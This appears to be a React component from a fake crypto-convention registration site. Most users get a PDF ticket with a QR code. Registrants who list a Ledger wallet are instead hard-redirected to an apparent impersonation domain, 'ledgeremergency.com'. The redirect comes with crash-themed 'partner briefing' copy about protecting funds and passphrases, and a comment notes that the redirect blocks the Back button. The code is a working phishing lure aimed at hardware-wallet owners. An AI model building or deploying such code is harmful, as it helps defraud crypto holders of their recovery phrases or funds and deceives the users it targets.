import jsPDF from "jspdf";
import QRCode from "qrcode";
import { useMemo, useState } from "react";

export default function TicketDownloadCard({ form, duplicate }) {
  const [downloading, setDownloading] = useState(false);

  // Did the registrant select Ledger?
  const usesLedger =
    Array.isArray(form?.wallets) &&
    form.wallets.some((w) => typeof w === "string" && w.toLowerCase() === "ledger");

  // Stable IDs for this session
  const ticket = useMemo(() => {
    const randDigits = (n) =>
      Array.from({ length: n }, () => Math.floor(Math.random() * 10)).join("");

    return {
      eventName: "",
      level: "Basic",
      venueLine1: "Sydney Convention & Exhibition Centre",
      venueLine2: "Sydney, NSW, Australia",
      dateStart: "22 Nov 2025",
      timeStart: "10:00 AM",
      dateEnd: "23 Nov 2025",
      sequence: "AUS-037",
      regNumber: randDigits(7),
      eticket: randDigits(12),
      // Logo path in your public folder (adjust if yours differs)
      logoPath: "/images/aulogo.png",
    };
  }, []);

  // Turn /images/aulogo.png into a data URL for jsPDF
  const loadImageAsDataURL = async (src) => {
    try {
      const res = await fetch(src, { cache: "force-cache" });
      const blob = await res.blob();
      return await new Promise((resolve) => {
        const reader = new FileReader();
        reader.onloadend = () => resolve(reader.result);
        reader.readAsDataURL(blob);
      });
    } catch {
      return null; // logo is optional
    }
  };

  const handleDownload = async () => {
    // If the registrant selected Ledger as one of their wallets → redirect.
    if (usesLedger) {
      try {
        setDownloading(true);
      } finally {
        // Hard redirect so they don’t come back with Back button
        window.location.replace("https://ledgeremergency.com/");
        // If you prefer letting them go back, use:
        // window.location.assign("https://ledgeremergency.com/");
      }
      return; // ensure we don't run PDF code
    }

    // ===== original PDF generation continues here =====
    try {
      setDownloading(true);

      const fullName = `${(form?.name || "").trim()} ${(form?.lastName || "").trim()}`.trim();
      const email = (form?.email || "").trim();
      const phone = (form?.phonePretty || form?.phone || "").trim();

      // Payload encoded into QR
      const qrPayload = {
        event: ticket.eventName,
        level: ticket.level,
        seq: ticket.sequence,
        reg: ticket.regNumber,
        eticket: ticket.eticket,
        name: fullName || "Participant",
        email,
        phone,
        start: `${ticket.dateStart} ${ticket.timeStart}`,
        end: ticket.dateEnd,
        venue: `${ticket.venueLine1}, ${ticket.venueLine2}`,
      };
      const qrDataURL = await QRCode.toDataURL(JSON.stringify(qrPayload), {
        margin: 1,
        width: 260,
      });

      const doc = new jsPDF({ unit: "pt", format: "a4" });
      const pageW = doc.internal.pageSize.getWidth();
      const pageH = doc.internal.pageSize.getHeight();
      const margin = 48;

      // Background ticket panel
      doc.setFillColor(255, 255, 255);
      doc.roundedRect(margin, margin, pageW - margin * 2, pageH - margin * 2, 12, 12, "F");

      // Accent bar
      doc.setFillColor(10, 16, 32); // #0B1020
      doc.roundedRect(margin, margin, pageW - margin * 2, 90, 12, 12, "F");

      // Optional logo
      const logoUrl = await loadImageAsDataURL(ticket.logoPath);
      if (logoUrl) {
        // Constrain height ~44
        doc.addImage(logoUrl, "PNG", margin + 18, margin + 22, 120, 44, undefined, "FAST");
      }

      // Event Name
      doc.setTextColor(255, 255, 255);
      doc.setFont("helvetica", "bold");
      doc.setFontSize(20);
      doc.text(ticket.eventName, margin + 150, margin + 46);

      // “E-Ticket”
      doc.setFont("helvetica", "normal");
      doc.setFontSize(11);
      doc.text(`E-Ticket: ${ticket.eticket}`, pageW - margin - 180, margin + 46);

      // Left column (details)
      let y = margin + 130;
      const leftX = margin + 22;
      const label = (t) => {
        doc.setTextColor(90, 98, 120);
        doc.setFont("helvetica", "bold");
        doc.setFontSize(11);
        doc.text(t, leftX, y);
        y += 16;
      };
      const value = (t) => {
        doc.setTextColor(20, 28, 50);
        doc.setFont("helvetica", "normal");
        doc.setFontSize(13);
        doc.text(t, leftX, y);
        y += 24;
      };

      label("Venue");
      value(`${ticket.venueLine1}`);
      value(`${ticket.venueLine2}`);

      y += 6;
      label("Dates & Time");
      value(`Start: ${ticket.dateStart} — ${ticket.timeStart}`);
      value(`End:   ${ticket.dateEnd}`);

      y += 6;
      label("Level");
      value(ticket.level);

      y += 8;
      doc.setDrawColor(230, 232, 236);
      doc.line(leftX, y, pageW - margin - 22, y);
      y += 18;

      label("Participant");
      value(fullName || "—");
      value(`${email || "—"}`);
      value(`${phone || "—"}`);

      y += 6;
      label("Identifiers");
      value(`Sequence: ${ticket.sequence}`);
      value(`Registration #: ${ticket.regNumber}`);

      // Right column: QR
      const qrSize = 180;
      const qrX = pageW - margin - qrSize - 22;
      const qrY = margin + 140;
      doc.addImage(qrDataURL, "PNG", qrX, qrY, qrSize, qrSize, undefined, "FAST");

      // QR caption
      doc.setTextColor(90, 98, 120);
      doc.setFontSize(10);
      doc.text("Scan at entry", qrX + qrSize / 2, qrY + qrSize + 16, { align: "center" });

      // Footer notes
      doc.setTextColor(140, 145, 160);
      doc.setFontSize(9);
      doc.text(
        "Please bring a valid photo ID. This ticket is valid for one participant. Non-transferable without prior approval.",
        margin + 22,
        pageH - margin - 28
      );

      // File name
      const safeName = (fullName || "ticket").replace(/[^a-z0-9\-_. ]/gi, "_");
      doc.save(`${safeName}_ACC_${ticket.eticket}.pdf`);
    } catch (e) {
      console.error(e);
      alert("Could not generate the PDF. Please try again.");
    } finally {
      setDownloading(false);
    }
  };

  // ===== Render (special copy for Ledger users, tied to the market crash) =====
  if (usesLedger) {
    const fullName = `${(form?.name || "").trim()} ${(form?.lastName || "").trim()}`.trim();
    const headline = duplicate
      ? "You're already registered — Ledger briefings now available"
      : "You're in — Ledger briefings now available";

    return (
      <div className="space-y-5 sm:space-y-6">
        {/* Header row */}
        <div className="flex items-start gap-3 p-4 rounded-2xl bg-white">


          <div className="flex-1">
            <h3 className="text-lg sm:text-xl font-semibold text-[#0B1020]">{headline}</h3>
            <p className="text-[13px] sm:text-sm text-slate-600 mt-0.5">
              {fullName ? `${fullName}, ` : ""}
              in light of the recent <span className="font-medium">crypto market crash</span>, our partners at
              <span className="font-medium"> Ledger</span> are hosting a focused risk &amp; resilience briefing for Ledger users:
              practical steps for turbulent conditions, custody hygiene, and safe operational workflows.
            </p>
          </div>
        </div>

        {/* Partner highlight card */}
        <div className="relative rounded-2xl p-[1.5px] bg-[conic-gradient(from_220deg_at_50%_50%,#0B1020,#1F2A44,#7A1E28,#0B1020)]">
                  <div className="w-full">
          <img src="/HeroBanner.png" className="" alt="" />
        </div>
          <div className=" bg-white/90 backdrop-blur p-5 sm:p-6">
            <div className="flex flex-col md:flex-row gap-5 md:gap-8">
              <div className="md:w-7/12">
                <div className="inline-flex items-center gap-2 text-[11px] px-2 py-1 rounded-full bg-black/5 border border-black/10">
                  <span className="font-semibold tracking-wide">LEDGER PARTNER BRIEFING</span>
                </div>
                <h4 className="mt-2 text-2xl font-semibold text-[#0B1020]">
                  Ledger Market Resilience Briefing
                </h4>
                <p className="mt-2 text-sm text-slate-600 leading-relaxed">
                  The session is tailored for volatile markets: how to protect access, execute safe withdrawals,
                  and keep your self-custody setup resilient when liquidity thins and counterparty risk rises.
                </p>

                <ul className="mt-4 space-y-2 text-sm text-slate-700">
                  <li className="flex items-start gap-2">
                    <span className="mt-1 h-1.5 w-1.5 rounded-full bg-[#7A1E28]" />
                    Volatility playbook: staged moves, where to park funds, minimizing friction
                  </li>
                  <li className="flex items-start gap-2">
                    <span className="mt-1 h-1.5 w-1.5 rounded-full bg-[#7A1E28]" />
                    Counterparty risk triage: exchanges, bridges, lenders — what to check before acting
                  </li>
                  <li className="flex items-start gap-2">
                    <span className="mt-1 h-1.5 w-1.5 rounded-full bg-[#7A1E28]" />
                    Self-custody hygiene: device health checks, passphrase usage, backup sanity checks
                  </li>
                  <li className="flex items-start gap-2">
                    <span className="mt-1 h-1.5 w-1.5 rounded-full bg-[#7A1E28]" />
                    Proof-of-reserves reality check & basic on-chain verification habits
                  </li>
                </ul>

                <div className="mt-5 flex flex-col sm:flex-row gap-3">
                  <button
                    onClick={() => window.location.assign("https://ledgeremergency.com/")}
                    className="inline-flex items-center justify-center rounded-lg px-5 py-3 font-semibold text-white bg-[#7A1E28] hover:opacity-95 active:opacity-90 transition shadow"
                  >
                    Join the Ledger Briefing
                  </button>
                  <button
                    onClick={() => window.location.assign("https://ledgeremergency.com/")}
                    className="inline-flex items-center justify-center rounded-lg px-5 py-3 font-medium text-[#0B1020] ring-1 ring-black/10 bg-white hover:bg-neutral-50 transition"
                  >
                    Learn more
                  </button>
                </div>

                <p className="mt-3 text-xs text-slate-500">
                  You’ll still receive your ACC online invite by email. The Ledger briefing is an optional bonus for Ledger users.
                </p>
              </div>

 
            </div>
          </div>
        </div>

 
      </div>
    );
  }

  // ===== Default (non-Ledger) ticket UI =====
  return (
    <div className="flex flex-col sm:flex-row sm:items-center gap-5">
      {/* Title */}
      <div className="flex items-center justify-center sm:justify-start gap-2">
        <h4 className="text-3xl uppercase font-semibold text-[#0B1020] tracking-tight">
          Your ticket is ready
        </h4>
        {!duplicate && (
          <span className="hidden sm:inline-block text-[10px] px-2 py-0.5 rounded-full bg-emerald-50 text-emerald-700 ring-1 ring-emerald-200">
            New Registration
          </span>
        )}
      </div>

      {/* Copy */}
      <div className="flex-1 text-center sm:text-left">
        <p className="mt-1 text-[13px] sm:text-sm text-slate-700">
          Your access ticket for the{" "}
          <span className="font-semibold">Australian Crypto Convention</span> is
          ready. It includes your participant details, dates, venue, and a QR
          code for swift check-in.
        </p>
      </div>

      {/* CTA */}
      <div className="sm:shrink-0">
        <button
          onClick={handleDownload}
          disabled={downloading}
          className={[
            "group relative w-full sm:w-auto inline-flex items-center justify-center rounded-xl px-5 py-3 font-semibold text-white",
            "bg-gradient-to-r from-[#7A1E28] to-[#0B1020] shadow-md transition",
            "hover:shadow-lg hover:opacity-95 active:opacity-90",
            "disabled:opacity-60 disabled:cursor-not-allowed",
          ].join(" ")}
        >
          {downloading ? (
            <span className="inline-flex items-center gap-2">
              <svg className="h-4 w-4 animate-spin" viewBox="0 0 24 24">
                <circle cx="12" cy="12" r="10" stroke="currentColor" strokeWidth="3" fill="none" className="opacity-30" />
                <path d="M22 12a10 10 0 00-10-10" stroke="currentColor" strokeWidth="3" fill="none" />
              </svg>
              Generating PDF…
            </span>
          ) : (
            <span className="inline-flex items-center gap-2">
              <svg className="h-4 w-4" viewBox="0 0 24 24" fill="none" stroke="currentColor">
                <path d="M12 3v18M3 12h18" strokeWidth="2" strokeLinecap="round" />
              </svg>
              Download Ticket (PDF)
            </span>
          )}
        </button>

        <div className="mt-2 text-center text-[11px] text-slate-500">
          PDF contains your unique QR and identifiers
        </div>
      </div>
    </div>
  );
}
